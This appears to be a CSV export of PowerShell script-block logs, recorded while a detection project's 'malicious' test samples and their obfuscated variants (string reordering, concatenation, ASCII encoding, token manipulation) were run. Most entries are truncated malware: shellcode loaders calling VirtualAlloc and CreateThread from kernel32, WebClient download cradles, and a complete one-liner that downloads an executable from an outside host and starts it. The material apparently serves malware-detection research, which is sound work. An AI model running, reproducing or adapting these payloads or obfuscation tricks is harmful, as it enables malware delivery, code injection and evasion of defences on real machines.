"8/6/2026 9:38:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:38:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1086.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:38:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1083.ps1","449","$wC=nEw-`obJ`e`cT SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$"
"8/6/2026 9:38:33 AM","","443","$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc."
"8/6/2026 9:38:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1083.ps1","1275","(((""{37}{17}{13}{71}{7}{61}{3}{2}{46}{53}{22}{63}{5}{64}{41}{32}{52}{82}{79}{62}{47}{77}{29}{81}{66}{72}{14}{40}{0}{73}{44}{20}{48}{16}{65}{12}{8}{11}{31}{49}{36}{23}{9}{80}{45}{56}{76}{54}{38}{75}{83"
"8/6/2026 9:38:25 AM","","443","$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc."
"8/6/2026 9:38:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1083.ps1","1014"," (('e'+'LswC='+'N'+'eW'+'-'+'OBJEct'+' SYStE'+'M'+'.NET.W'+'EBCl'+'ieNT;eL'+'su=x'+'E8'+'Mozil'+'l'+'a'+'/5.0 (Wind'+'o'+'ws NT '+'6.1; WOW'+'64; Trident'+'/7'+'.0'+'; '+'rv:1'+'1.'+'0) like'+' Gec'+'"
"8/6/2026 9:38:17 AM","","443","$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc."
"8/6/2026 9:38:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1083.ps1","1963","[CHAr[]](36 ,119,67,61,78, 101 ,87 ,45 , 79, 66, 74 , 69 , 99, 116 , 32, 83 ,89, 83, 116 ,69,77,46 , 78 , 69 , 84 , 46 , 87,69 , 66 ,67,108, 105,101,78 ,84 ,59 , 36 ,117 ,61 ,39 ,77,111, 122, 105 ,108"
"8/6/2026 9:38:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1083.ps1","443","$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc."
"8/6/2026 9:38:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:38:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:38:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:38:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:38:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1069.ps1","2250","$tq73 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:37:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:53 AM","","2243","$tq73 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:37:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1069.ps1","2965"," ((""{30}{2}{50}{11}{55}{57}{35}{66}{42}{12}{32}{13}{24}{51}{56}{6}{68}{33}{26}{3}{58}{63}{14}{7}{1}{47}{49}{46}{69}{20}{52}{37}{54}{43}{60}{29}{8}{39}{27}{23}{15}{21}{44}{0}{61}{40}{5}{62}{59}{53}{36}"
"8/6/2026 9:37:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:45 AM","","2243","$tq73 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:37:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1069.ps1","2649",".( $SheLLID[1]+$SHELLiD[13]+'x')((('qpVtq73 = xCX[DllImport(R9'+'hkernel32.dllR9h)]public static extern IntPtr VirtualAlloc(IntPtr lpAd'+'dress, uint dwSize, uint '+'flAllocationType,'+' uint flProtec"
"8/6/2026 9:37:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:37 AM","","2244"," $tq73 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 9:37:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1069.ps1","21","{( [INt]$_-As[chAR])}"
"8/6/2026 9:37:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1069.ps1","9951",".((vARiable '*mdr*').naMe[3,11,2]-joIN'') ( ""$( Set-ITEm 'VaRiabLe:oFS' '') "" +[stRING](( 36 , 116, 113, 55 ,51 , 32 ,61,32 , 39 ,91,68 , 108 ,108 , 73, 109,112,111 , 114 , 116, 40,34, 107, 101 ,114 ,"
"8/6/2026 9:37:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1069.ps1","2243","$tq73 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:37:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1064.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:37:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:13 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:37:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1064.ps1","2783","Iex ((((""{12}{32}{17}{18}{6}{11}{21}{41}{2}{9}{28}{15}{16}{27}{40}{13}{3}{5}{37}{19}{25}{45}{38}{7}{33}{30}{39}{43}{10}{42}{36}{31}{44}{29}{22}{0}{23}{8}{20}{1}{4}{34}{35}{14}{46}{26}{24}"" -f'00',',0x"
"8/6/2026 9:37:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:37:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:37:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:37:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:37:05 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:37:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1064.ps1","2667",".( $sHellid[1]+$SheLLiD[13]+'x')((('5zKc = rji[DllImport(o4wkerne'+'l32.dllo4w)]public static extern IntPtr Vir'+'tualAlloc(IntPtr lpAddress, uint dwS'+'ize, uint flAllocationType, uint flProtect);[Dl"
"8/6/2026 9:36:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:57 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1064.ps1","19","{([char] [INt] $_)}"
"8/6/2026 9:36:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1064.ps1","7690"," . ( $verbOsEprefEreNCE.TOstRING()[1,3]+'x'-JoiN'') ( ( '36z99&32x61F32S39z91F68S108x108}73x109!112S111}114}116}40!34T107!101&114T110z101&108l51&50z46x100l108z108!34x41l93l112T117z98x108!105S99Y32S115"
"8/6/2026 9:36:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1064.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1060.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:33 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1060.ps1","2970",". ( $PshOMe[4]+$pSHOME[34]+'x')((((""{68}{5}{41}{19}{7}{10}{12}{46}{40}{31}{62}{36}{53}{54}{16}{65}{21}{20}{25}{66}{3}{33}{0}{11}{63}{26}{59}{22}{38}{60}{30}{45}{44}{32}{8}{48}{18}{29}{6}{57}{23}{61}{5"
"8/6/2026 9:36:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:25 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1060.ps1","2683"," &((Get-vaRIABLe '*mdR*').nAmE[3,11,2]-jOiN'')((('lrFc = Q5H[DllImport(dVlkernel32.dlldVl)]public static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSi'+'ze, uint flAllocation'+'Type, uint "
"8/6/2026 9:36:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1060.ps1","9774","-jOin [cHAR[]] (36,99 , 32 ,61 , 32 ,39 , 91 , 68 ,108,108 , 73, 109 , 112 ,111, 114 , 116 ,40 , 34 , 107,101 , 114 ,110 , 101, 108,51,50,46 , 100 ,108,108 ,34,41 ,93, 112,117, 98,108 ,105 ,99 , 32 , "
"8/6/2026 9:36:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1060.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:36:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:36:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:36:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:36:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:36:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1054.ps1","116","(New`-Obje`CT System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');S`TARt-PrOce`Ss 'mess.exe'
"
"8/6/2026 9:35:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:52 AM","","110","(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 9:35:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1054.ps1","369","((""{16}{9}{0}{5}{15}{25}{6}{7}{12}{23}{22}{8}{17}{21}{19}{18}{20}{11}{2}{1}{10}{3}{14}{24}{13}{4}"" -f 'Syst',');','Hk','-Process ','Hk','em.','lient)','.Dow','/','t ','Start','exeE','nloadFile(EHk','."
"8/6/2026 9:35:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:44 AM","","110","(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 9:35:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1054.ps1","299","('(New-'+'Object '+'System.Net.We'+'bC'+'lie'+'nt).'+'Download'+'Fi'+'le'+'(T'+'1i'+'http'+':'+'/'+'/c'+'a'+'jos'+'.in/0x/'+'1.ex'+'eT'+'1i,T'+'1imess'+'.exeT1'+'i'+');'+'St'+'ar'+'t-Proc'+'es'+'s '+'"
"8/6/2026 9:35:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:36 AM","","110","(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 9:35:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1054.ps1","23","{ ([InT] $_ -aS[chAr])}"
"8/6/2026 9:35:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1054.ps1","492",". ( $ShelLid[1]+$ShElliD[13]+'X') (-joiN ('40X78H101r119i45l79q98i106X101<99r116Y32i83r121q115W116<101q109<46W78X101<116X46W87i101X98<67%108r105<101H110r116<41W46q68X111i119H110<108%111X97Y100H70l105<"
"8/6/2026 9:35:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1054.ps1","110","(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
"8/6/2026 9:35:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1047.ps1","2221","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:35:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:12 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:35:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1047.ps1","2932"," &( $pshOme[21]+$PsHome[30]+'x')(((""{7}{2}{54}{19}{48}{68}{67}{55}{8}{62}{34}{50}{51}{40}{9}{1}{38}{14}{22}{29}{53}{17}{33}{4}{47}{32}{63}{56}{49}{30}{25}{5}{46}{27}{52}{26}{37}{15}{28}{11}{41}{18}{44"
"8/6/2026 9:35:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:35:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:35:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:35:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:35:04 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:35:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1047.ps1","2605",". ( ([sTrING]$VerbosEprEfeREnce)[1,3]+'x'-jOIn'') ( (('uMxc = aGe[DllImport(6vPkernel32.dll6vP)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, u'+'int f"
"8/6/2026 9:34:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:56 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:34:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1047.ps1","18","{ ([chAr][iNT]$_)}"
"8/6/2026 9:34:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1047.ps1","7550","&( ([STrINg]$VERBOsEprEfERENCe)[1,3]+'x'-jOin'') ( ( '36R99<32p61J32~39!91>68{108J108!73J109~112<111R114Q116~40{34%107<101R114>110R101p108R51J50>46J100~108~108>34%41{93Q112Q117>98!108~105<99~32>115>11"
"8/6/2026 9:34:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1047.ps1","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:34:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1043.ps1","2249","$Bel = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:34:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:32 AM","","2244","$Bel = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:34:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1043.ps1","2814","((""{25}{38}{33}{40}{16}{8}{6}{21}{34}{19}{13}{28}{35}{18}{42}{27}{45}{32}{46}{30}{0}{12}{2}{37}{41}{15}{23}{36}{14}{5}{10}{20}{7}{22}{24}{29}{1}{44}{39}{31}{11}{43}{26}{4}{17}{3}{9}""-f'1,0x59,0x5a,0x5"
"8/6/2026 9:34:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:34:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:34:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:34:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:34:24 AM","","2244","$Bel = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
